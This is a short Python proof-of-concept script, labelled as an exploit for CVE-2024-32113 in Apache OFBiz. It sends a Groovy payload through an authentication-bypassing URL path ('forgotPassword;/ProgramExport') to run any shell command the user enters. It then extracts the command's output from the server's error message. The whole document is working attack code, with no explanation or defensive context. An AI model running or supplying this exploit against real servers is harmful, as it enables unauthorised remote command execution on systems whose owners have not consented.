import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(url, command):
    print("[+] CVE-2024-32113 - Apache OFBiz RCE Exploit")
    print(f"[+] Executing command: {command}")

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = f"groovyProgram=throw+new+Exception('{command}'.execute().text);"

    try:
        response = requests.post(url + '/webtools/control/forgotPassword;/ProgramExport', headers=headers, data=data, verify=False)

        if response.status_code == 200:
            print("\n[+] Exploit successful")
            soup = BeautifulSoup(response.text, 'html.parser')
            error_message = soup.find('div', class_='content-messages errorMessage')

            if error_message:
                filtered_output = error_message.get_text().strip()
                print(f"[+] Extracted Payload Response:\n{filtered_output}")
            else:
                print("[-] Couldn't find the expected output in the response.")
        else:
            print("[-] Exploit failed. Status code:", response.status_code)

    except requests.RequestException as e:
        print(f"[-] An error occurred: {e}")

if __name__ == '__main__':
    command = input("Enter the shell command you want to execute: ")
    exploit("https://localhost:8443", command)
